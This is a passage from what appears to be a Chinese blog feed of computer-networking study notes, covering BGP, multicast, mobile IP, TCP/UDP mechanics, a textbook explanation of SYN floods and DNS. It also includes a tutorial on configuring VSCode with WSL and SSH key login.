alt="image-20240309094030723"></p><blockquote><p>关于OSPF属于哪一层协议有点争议，判断某个协议属于哪一层：一个协议的实现需要依赖协议所在层次的下一层功能；所以RIP依赖UDP所以是应用层协议。</p><p>而OSPF依赖网络层，属于传输层协议；但是在考研的考纲中，OSPF是不使用UDP数据报传送，而是直接使用IP数据报传送，所以被划分到网络层协议。</p></blockquote><h2 id="其他特点"><a href="#其他特点" class="headerlink" title="其他特点"></a>其他特点</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095051174.png" alt="image-20240309095051174"></p><h1 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h1><p><strong>交换信息的特点</strong></p><ul><li>与其他AS的邻站BGP发言人交换信息。</li><li>交换的网络可达性的信息，即要到达某个网络所要经过的一系列AS。</li><li>发生变化时更新有变化的部分。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095348561.png" alt="image-20240309095348561"></p><blockquote><p>发言人也不一定要是边界路由器，可以自己设定。</p><p>BGP协议交换内容首次为整个路由表，后面则为有变化的部分。</p></blockquote><h2 id="BGP交换信息过程"><a href="#BGP交换信息过程" class="headerlink" title="BGP交换信息过程"></a>BGP交换信息过程</h2><p>BGP 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。当 BGP 发言人互相交换了网络可<br>性的信息后，各 BGP发言人就根据所采用的策略从收到的路由信息中找出到达各 AS的较好路由。</p><ul><li><p>BGP发言人交换路径向量：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095956540.png" alt="image-20240309095956540"></p><p>主干网还可发出通知：要到达网络N5、N6和N7可沿路径(AS1,AS3)。</p></li></ul><h2 id="BGP协议报文格式"><a href="#BGP协议报文格式" class="headerlink" title="BGP协议报文格式"></a>BGP协议报文格式</h2><p>一个BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，即通过TCP传送，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309100149532.png" alt="image-20240309100149532"></p><h2 id="BGP协议特点"><a href="#BGP协议特点" class="headerlink" title="BGP协议特点"></a>BGP协议特点</h2><p>BGP 支持 CIDR，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。</p><p>在 BGP 刚刚运行时，BGP的邻站是交换整个的 BGP路由表。但以后只需要在发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处。</p><h2 id="BGP-4的四种报文"><a href="#BGP-4的四种报文" class="headerlink" title="BGP-4的四种报文"></a>BGP-4的四种报文</h2><ol><li><p><strong>OPEN(打开)报文：</strong>用来与相邻的另一个BGP发言人建立关系，并认证发送方。</p></li><li><p><strong>UPDATE(更新)报文：</strong>通告新路径或撤销原路径。</p></li><li><p><strong>KEEPALIVE(保活)报文：</strong>在无UPDATE时，周期性证实邻站的连通性；也作为OPEN的确认。</p></li><li><p><strong>NOTIFICATION(通知)报文：</strong>报告先前报文的差错;也被用于关闭连接。</p></li></ol><h1 id="三种路由协议的比较"><a href="#三种路由协议的比较" class="headerlink" title="三种路由协议的比较"></a>三种路由协议的比较</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309100705696.png" alt="image-20240309100705696"></p><h1 id="IP组播"><a href="#IP组播" class="headerlink" title="IP组播"></a>IP组播</h1><h2 id="IP数据报的三种传输方式"><a href="#IP数据报的三种传输方式" class="headerlink" title="IP数据报的三种传输方式"></a>IP数据报的三种传输方式</h2><ol><li><strong>单播：</strong>单播用于发送数据包到单个目的地，且每发送一份单播报文都使用一个单播IP地址作为目的地址。是一种点对点传输方式。</li><li><strong>广播：</strong>广播是指发送数据包到同一广播域或子网内的所有设备的一种数据传输方式，是一种点对多点传输方式。</li><li><strong>组播(多播)：</strong>当网络中的某些用户需要特定数据时，组播数据发送者仅发送一次数据，借助组播路由协议为组播数据包建立组播分发树，被传递的数据到达距离用户端尽可能近的节点后才开始复制和分发，是一种点对多点传输方式。</li></ol><p>组播提高了数据传送效率。减少了主干网出现拥塞的可能性。组播组中的主机可以是在同一个物理网络，也可以来自不同的物理网络(如果有组播路由器的支持也就是运行组播协议的路由器)。</p><p>以一个发送视频数据的图例来解释：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309101432054.png" alt="image-20240309101432054"></p><p>组播在每条链路上只有一份数据，大大降低网络拥塞的可能；如果是单播传输的话，服务器就要复制90份数据然后进行分发，链路上就会出现90份数据，网络拥塞程度就会上升。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309101706544.png" alt="image-20240309101706544"></p><h2 id="IP组播地址"><a href="#IP组播地址" class="headerlink" title="IP组播地址"></a>IP组播地址</h2><p>IP组播地址让源设备能够将分组发送给一组设备。属于多播组的设备将被分配一个组播组IP地址(一群共同需求<br>主机的相同标识)。</p><p>组播地址范围为224.0.0.0~239.255.255.255(D类地址)，一个D类地址表示一个组播组。组播地址只能用作分组的目标地址。源地址总是为单播地址。</p><p><strong>组播数据报特点</strong></p><ol><li><p>组播数据报也是“尽最大努力交付”，不提供可靠交付，应用于UDP</p></li><li><p>对组播数据报不产生ICMP差错报文。</p></li><li><p>并非所有D类地址都可以作为组播地址。</p></li></ol><h2 id="硬件组播"><a href="#硬件组播" class="headerlink" title="硬件组播"></a>硬件组播</h2><p>在上面的视频传输的例子中，又有<strong>因特网范围内组播</strong>和<strong>硬件组播</strong>。</p><p>硬件组播是在局域网内进行组播；因特网组播则是还未进入局域网时组播。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309103003239.png" alt="image-20240309103003239"></p><h2 id="IGMP协议与组播路由选择协议"><a href="#IGMP协议与组播路由选择协议" class="headerlink" title="IGMP协议与组播路由选择协议"></a>IGMP协议与组播路由选择协议</h2><h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p>也叫网际组管理协议</p><p><strong>IGMP协议工作的两个阶段</strong></p><ol><li><p>某主机要加入组播组时，该主机向组播组的组播地址发送一个IGMP报文，声明自己要称为该组的成员。本地组播路由器收到IGMP报文后，要利用组播路由选择协议把这组成员关系发给因特网上的其他组播路由器。</p></li><li><p>本地组播路由器周期性探询本地局域网上的主机，以便知道这些主机是否还是组播组的成员。</p><p>只要有一个主机对某个组响应，那么组播路由器就认为这个组是活跃的；如果经过几次探询后没有一个主机响应，组播路由器就认为本网络上的没有此组播组的主机，因此就不再把这组的成员关系发给其他的组播路由器。</p></li></ol><blockquote><p>组播路由器知道的成员关系只是所连接的局域网中有无组播组的成员。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309103754389.png" alt="image-20240309103754389"></p><h3 id="组播路由选择协议"><a href="#组播路由选择协议" class="headerlink" title="组播路由选择协议"></a>组播路由选择协议</h3><p>组播路由选择协议目的是找出以源主机为根节点的组播转发树。</p><p>对不同的多播组对应于不同的多播转发树；同一个多播组，对不同的源点也会有不同的多播转发树。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309104118961.png" alt="image-20240309104118961"></p><p><strong>常用的三种算法</strong></p><ol><li><p>基于链路状态的路由选择</p></li><li><p>基于距离-向量的路由选择</p></li><li><p>协议无关的组播(稀疏&#x2F;密集)</p><p>组播组中的主机比较分散就用稀疏算法；较为密集就用密集算法。</p></li></ol><blockquote><p>第一第二种都在前面有说过。</p></blockquote><h1 id="移动IP"><a href="#移动IP" class="headerlink" title="移动IP"></a>移动IP</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>移动IP技术是移动结点(计算机&#x2F;服务器等)以固定的网络IP地址，实现跨越不同网段的漫游功能，并保证了基于网络IP的网络权限在漫游过程中不发生任何改变。</p><p><strong>移动结点</strong> 具有永久IP地址的移动设备。</p><p><strong>归属代理(本地代理)</strong> 一个移动结点的永久“居所”称为归属网络，在归属网络中代表移动节点执行移动管理功能的实体叫做归属代理。</p><p><strong>永久地址(归属地址&#x2F;主地址)</strong> 移动站点在归属网络中的原始地址。</p><p><strong>外部代理(外地代理)</strong> 在外部网络中帮助移动节点完成移动管理功能的实体称为外部代理。</p><p><strong>转交地址(辅地址)</strong> 可以是外部代理的地址或动态配置的一个地址。</p><h2 id="移动IP通信过程"><a href="#移动IP通信过程" class="headerlink" title="移动IP通信过程"></a>移动IP通信过程</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105307481.png" alt="image-20240309105307481"></p><h1 id="网络层设备"><a href="#网络层设备" class="headerlink" title="网络层设备"></a>网络层设备</h1><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>路由器是一种具有多个输入端口和输出端口的专用计算机，其任务是转发分组。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105633658.png" alt="image-20240309105633658"></p><p><strong>输入端口的处理</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105754630.png" alt="image-20240309105754630"></p><p><strong>输出端口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105909980.png" alt="image-20240309105909980"></p><h2 id="三层设备的区别"><a href="#三层设备的区别" class="headerlink" title="三层设备的区别"></a>三层设备的区别</h2><p><strong>路由器</strong> 可以互联两个不同网络层协议的网段。</p><p><strong>网桥</strong> 可以互联两个物理层和链路层不同的网段。</p><p><strong>集线器</strong> 不能互联两个物理层不同的网段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309110212888.png" alt="image-20240309110212888"></p><h2 id="路由表与路由转发"><a href="#路由表与路由转发" class="headerlink" title="路由表与路由转发"></a>路由表与路由转发</h2><p>路由表根据路由选择算法得出的，主要用途是路由选择，总用软件来实现</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309110538681.png" alt="image-20240309110538681"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode配置Linux开发环境</title>
      <link href="/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="VSCode配置wsl开发环境"><a href="#VSCode配置wsl开发环境" class="headerlink" title="VSCode配置wsl开发环境"></a>VSCode配置wsl开发环境</h1><p>在vscode上使用wsl进行开发环境就比较简单，我这里用的是Ubuntu的wsl</p><p>首先检查一下wsl里面有没有gcc和g++编译器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">g++ -v<br>gcc -v<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306164855577.png" alt="image-20240306164855577"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306164915530.png" alt="image-20240306164915530"></p><p>如果没有就执行下面命令安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get update #更新软件包列表<br>sudo apt-get install build-essential gdb #安装 GNU 编译器工具和 GDB 调试器<br></code></pre></td></tr></table></figure><p>然后去创建一个项目文件夹，在需要vscode打开的文件夹下输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">code .<br></code></pre></td></tr></table></figure><p>就会自动开启一个vscode</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165346221.png" alt="image-20240306165346221"></p><p>左下角就会显示wsl的连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165411416.png" alt="image-20240306165411416"></p><p>随便写个cpp文件，然后我们在终端就可以进行编译了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165629607.png" alt="image-20240306165629607"></p><p><strong>从vscode中启动wsl</strong></p><p>只需要安装两个remote扩展就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170459303.png" alt="image-20240306170459303"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170511786.png" alt="image-20240306170511786"></p><p>然后命令输入wsl即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170442810.png" alt="image-20240306170442810"></p><p>如果有多个发行版想要指定的话就选这个</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170834830.png" alt="image-20240306170834830"></p><blockquote><p>另外不想命令行编译调试的话也可以直接在为wsl安装code runner和c++扩展即可</p></blockquote><h1 id="VSCode配置远程服务器连接"><a href="#VSCode配置远程服务器连接" class="headerlink" title="VSCode配置远程服务器连接"></a>VSCode配置远程服务器连接</h1><p>首先安装好这个插件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205105832.png" alt="image-20240306205105832"></p><p>然后去config文件配置ssh文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205237737.png" alt="image-20240306205237737"></p><p>要先在本机使用如下命令生成密钥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  //一般默认保存在~/.ssh路径下<br></code></pre></td></tr></table></figure><p>然后配置文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Host &lt;随便填主机名&gt;<br>HostName &lt;远程主机ip地址&gt;<br>User &lt;登陆用户&gt;<br>IdentityFile &lt;私钥路径&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205426338.png" alt="image-20240306205426338"></p><p>配置好本机ssh文件之后，公钥放在远程主机的~&#x2F;.ssh下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205744858.png" alt="image-20240306205744858"></p><p>然后把公钥文件写入authorized_keys里即可完成整个配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat id_rsa_vps.pub &gt;&gt; authorized_keys<br></code></pre></td></tr></table></figure><blockquote><p>公钥私钥是用来进行免密登陆的，也可以不使用，只不过在登陆的时候就要输入密码</p></blockquote><p>然后点击在新窗口连接主机</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306210558090.png" alt="image-20240306210558090"></p><p>成功！其余的开发配置就和上面的wsl配置没什么区别了，就懒得整了</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-3</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<h1 id="传输层概述"><a href="#传输层概述" class="headerlink" title="传输层概述"></a>传输层概述</h1><p>传输层学习两种协议，TCP和UDP协议</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305182817812.png" alt="image-20240305182817812"></p><p><strong>TCP协议的作用：</strong></p><ul><li>可靠传输</li><li>流量控制</li><li>拥塞控制</li></ul><p>传输层是只有主机才有的层次，传输层可以为应用层提供服务，也可以使用网络层的服务</p><p>传输层的功能：</p><ul><li>传输层提供进程和进程之间的逻辑通信。网络层则提供主机之间的逻辑通信。</li><li>复用和分用。</li><li>传输层对收到的报文进行差错检测</li><li>传输层有两种协议</li></ul><h1 id="传输层的寻址与端口"><a href="#传输层的寻址与端口" class="headerlink" title="传输层的寻址与端口"></a>传输层的寻址与端口</h1><p><strong>复用</strong>：应用层所有的应用进程都可以通过传输层再传输到网络层。</p><p><strong>分用</strong>：传输层从网络层收到数据后交付指明的应用进程。</p><p>端口号标识主机中的应用进程。</p><p>端口号长度为16bit，所以能表示的端口号数量为65535个。</p><p><strong>端口号的分类：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305183319948.png" alt="image-20240305183319948"></p><p>所以有些程序都会有默认端口号，比如HTTP的80端口，HTTPS的443端口，这里列举出一些协议的端口号：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305183457929.png" alt="image-20240305183457929"></p><blockquote><p> 在网络中采用发送方和接收方的套接字组合来识别端点，套接字唯一标识了网络中的一个主机和它上面的一个进程。</p><p>套接字socket&#x3D;(主机IP地址，端口号)</p></blockquote><h1 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h1><p>UDP只在IP数据报服务之上增加了很少功能，即复用分用和差错检测功能。</p><h2 id="UDP的主要特点"><a href="#UDP的主要特点" class="headerlink" title="UDP的主要特点"></a>UDP的主要特点</h2><ol><li><p>UDP是无连接的，减少开销和发送数据之前的时延。</p></li><li><p>UDP使用最大努力交付，即不保证可靠交付。</p></li><li><p>UDP是面向报文的，适合一次性传输少量数据的网络应用。</p></li><li><p>UDP无拥塞控制，适合很多实时应用，比如一些实时视频之类的，丢失了少量数据也是允许的。</p></li><li><p>UDP首部开销小，8B(字节)，TCP20B(字节)</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305215954723.png" alt="image-20240305215954723"></p><h2 id="UDP首部格式"><a href="#UDP首部格式" class="headerlink" title="UDP首部格式"></a>UDP首部格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220132283.png" alt="image-20240305220132283"></p><h2 id="UDP校验过程"><a href="#UDP校验过程" class="headerlink" title="UDP校验过程"></a>UDP校验过程</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220303149.png" alt="image-20240305220303149"></p><p><strong>伪首部校验</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305220730662.png" alt="image-20240305220730662"></p><h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><h2 id="TCP协议的特点"><a href="#TCP协议的特点" class="headerlink" title="TCP协议的特点"></a>TCP协议的特点</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305221800753.png" alt="image-20240305221800753"></p><p>发送数据时，先把一定的字节放入缓存中，然后取一些字节组成报文段然后带上TCP头部组成完整报文段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305222029888.png" alt="image-20240305222029888"></p><blockquote><p>字节数不是固定的</p></blockquote><h2 id="TCP报文段首部格式"><a href="#TCP报文段首部格式" class="headerlink" title="TCP报文段首部格式"></a>TCP报文段首部格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305222924879.png" alt="image-20240305222924879"></p><p><strong>下面是各个部分的作用：</strong></p><ul><li><p>序号:在一个TCP连接中传送的字节流中的每一个字节都按顺序编号，本字段表示本报文段所发送数据的第一个字节的序号。</p></li><li><p>确认号:期望收到对方下一个报文段的第一个数据字节的序号。若确认号为N,则证明到序号N-1为止的所有数据都已正确收到。</p></li><li><p>数据偏移(首部长度):TCP报文段的数据起始处距离TCP报文段的起始处有多远以4B位单位，即1个数值是4B。</p></li><li><p>窗口:指的是发送本报文段的一方的接收窗口，即现在允许对方发送的数据量。</p></li><li><p>检验和:检验首部+数据，检验时要加上12B伪首部，第四个字段为6。</p></li><li><p>紧急指针:URG&#x3D;1时才有意义，指出本报文段中紧急数据的字节数</p></li><li><p>选项:最大报文段长度MSS、窗口扩大、时间戳、选择确认…</p></li><li><p>填充:即将报文首部填充至4B的整数倍</p></li></ul><p><strong>6个控制位</strong></p><ul><li><p>紧急位URG：URG&#x3D;1时，标明此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用在缓存里排队，配合紧急指针字段使用。</p></li><li><p>确认位ACK：ACK&#x3D;1时确认号有效，在连接建立后所有传送的报文段都必须把ACK置为1。</p></li><li><p>推送位PSH：PSH&#x3D;1时，接收方尽快交付接收应用进程，不再等到缓存填满再向上交付。</p></li><li><p>复位RST：RST&#x3D;1时，表明TCP连接中出现严重差错，必须释放连接，然后再重新建立传输链接。</p></li><li><p>同步位SYN：SYN&#x3D;1时，表明是一个连接请求&#x2F;连接接受报文。</p></li><li><p>终止位FIN：FIN&#x3D;1时，表明此报文段发送方数据已发完，要求释放连接。</p></li></ul><h1 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h1><p>TCP连接传输的三个阶段：</p><p>连接建立&#x3D;》数据传输&#x3D;》连接释放</p><h2 id="TCP连接建立"><a href="#TCP连接建立" class="headerlink" title="TCP连接建立"></a>TCP连接建立</h2><p>采用三次握手建立TCP连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305225606569.png" alt="image-20240305225606569"></p><blockquote><p>seq是序号，ack是确认号</p></blockquote><h2 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h2><p>SYN洪泛攻击发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供服务了。</p><p><strong>防范SYN洪泛攻击的方法</strong></p><p>可以通过设置SYN cookie</p><h2 id="TCP的连接释放"><a href="#TCP的连接释放" class="headerlink" title="TCP的连接释放"></a>TCP的连接释放</h2><p>采用四次握手</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305230921528.png" alt="image-20240305230921528"></p><blockquote><p>等待2MSL的目的是为了能够彻底关闭连接</p><p>因为若B没有收到确认报文段会在2MSL内重新发送第三个报文段，若A直接关闭了就会收不到重传的报文段，B就会一直重传导致连接无法完全关闭</p></blockquote><h1 id="TCP可靠传输"><a href="#TCP可靠传输" class="headerlink" title="TCP可靠传输"></a>TCP可靠传输</h1><p>可靠传输就是保证接收方进程从缓存区读出的字节流与发送方发出的字节流是完全一样的。</p><p>实现可靠传输的机制：</p><ol><li><p><strong>校验</strong></p><p>增加伪首部与UDP校验一样，</p></li><li><p><strong>序号</strong></p><p>一个字节占一个序号；序号字段指的是一个报文的第一个字节的序号</p><p>一个报文段的字节数取决于MTU(链路层的最大传输单元)</p></li><li><p><strong>确认</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306003306167.png" alt="image-20240306003306167"></p><p>这里发送方要在收到确认报文段之后才会将报文段从缓存中删去，因为可能需要重传。</p><p>如果456和78一起发送过去，只收到了78，接受方就会返回ack为4的报文段，发送方就会重传456报文段，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306003639763.png" alt="image-20240306003639763"></p></li><li><p><strong>重传</strong></p><p>TCP的发送方在规定时间内没有收到确认报文段就要重传已发送的报文段；也就是超时重传</p><p>重传时间的设置就采用了自适应算法，动态改变重传时间RTTs(加权平均往返时间)</p><p>不过等待时间过久，还有一种冗余ACK(冗余确认)方法来提高效率</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306004112025.png" alt="image-20240306004112025"></p></li></ol><h1 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h1><p>流量控制：也就是控制发送速率，使接收方能够完全接收数据</p><p>TCP采用滑动窗口机制实现流量控制</p><p>在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，即接收窗口rwnd(接收方设置确认报文段的窗口字段来将rwnd通知给发送方)，发送方的发送窗口取接收窗口rwnd和拥塞窗口cwnd的最小值。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306132247748.png" alt="image-20240306132247748"></p><h1 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h1><p>出现拥塞的条件：对资源需求总和&gt;可用资源</p><p>拥塞控制就是防止过多的数据注入到网络中。(全局性控制)</p><p>拥塞控制还有四种算法：满开始、拥塞避免、快重传、快恢复</p><p><strong>现在先假定一下情况来学习这四种算法：</strong></p><ol><li><p>数据单方向传送，而另一个方向只传送确认(就是没有捎带确认，也就是附加数据)</p></li><li><p>接收方总是有足够大的缓存空间，因而发送窗口大小取决于拥塞程度</p><p>发送窗口&#x3D;Min{接收窗口rwnd，拥塞窗口cwnd}</p><p>接收窗口：接收方根据接受缓存设置的值，并告知给发送方，反映接收方容量。<br>拥塞窗口：发送方根据自己估算的网络拥塞程度而设置的窗口值，反映网络当前容量。</p></li></ol><h2 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306134517263.png" alt="image-20240306134517263"></p><p>慢开始就是逐渐增加注入的报文段，在达到sshresh(慢开始门限)之前以2的指数倍上升，第一次传输1，第二次则2，第三次则4，以此类推，这里在收到确认报文段之后就会立刻改变拥塞窗口大小；到达门限之后就线性增长，这里的图就逐次加一。</p><p>检测到网络拥塞之后，cwnd(拥塞窗口)就直接降到一，然后重复前面的过程，但是唯一改变的就是sshresh，是在检测到网络拥塞时，将拥塞窗口除以2作为新的sshresh</p><h2 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306134721633.png" alt="image-20240306134721633"></p><p>快重传就是上面说到的冗余ACK，收到三个重复的确认之后就会执行快重传。</p><p>快重传之后执行的就是快恢复，快恢复不会立刻降到拥塞窗口为1，而是降到新的门限值，门限值的大小就是检测到三个重复确认时的拥塞窗口除以2.</p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-2</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>应用层对应用程序的通信提供服务。</p><p><strong>应用层协议定义:</strong></p><ul><li><p>应用进程交换的报文类型，请求还是响应?</p></li><li><p>各种报文类型的语法，如报文中的各个字段及其详细描述字段的语义，即包含在字段中的信息的含义。</p></li><li><p>进程何时、如何发送报文，以及对报文进行响应的规则。</p></li></ul><p><strong>应用层的功能：</strong></p><ul><li><p>文件传输、访问和管理    </p></li><li><p>电子邮件      </p></li><li><p>虚拟终端     </p></li><li><p>查询服务和远程作业登录</p></li></ul><p><strong>应用层重要协议</strong></p><p> <strong>FTP</strong>，<strong>SMTP、POP3</strong>， <strong>HTTP</strong>， <strong>DNS</strong></p><p><strong>网络应用模型</strong></p><ul><li>客户&#x2F;服务器模型（C&#x2F;S）</li><li>P2P模型（Peer-to-peer）也叫对等模型</li></ul><h1 id="DNS系统"><a href="#DNS系统" class="headerlink" title="DNS系统"></a>DNS系统</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>域名从左到右级别逐渐升高，最右边的叫做顶级域名</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091606492.png" alt="image-20240305091606492"></p><p><strong>根</strong></p><p>根指的是顶级域名右边的一点，所以完整的域名写法应该是<a href="http://www.xxx.com.,从根后面才是顶级域名/">www.xxx.com.，从根后面才是顶级域名</a></p><p><strong>顶级域名</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091738436.png" alt="image-20240305091738436"></p><p>反向域名即通过IP地址来反向解析出域名</p><p><strong>二级域名</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305091920777.png" alt="image-20240305091920777"></p><p><strong>域名树</strong></p><p>域名可以有很多级，比如学校的域名就有三级、四级等等</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305092053637.png" alt="image-20240305092053637"></p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><ul><li><p>本地域名服务器：当一个主机发出DNS查询请求时，这个查询请求报文就发给本地域名服务器。</p></li><li><p>根域名服务器：知道所有的域名，就是知道顶级域名对应那个顶级域名服务器，在本地域名服务器找不到域名时就会先去请求根域名服务器</p></li><li><p>顶级域名服务器：管理该顶级域名服务器注册的所有二级域名</p></li><li><p>权限域名服务器：负责一个区的域名服务器</p></li></ul><p>总之就是向DNS请求来指明下一步要查询哪一个DNS服务器，这是一个示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093038757.png" 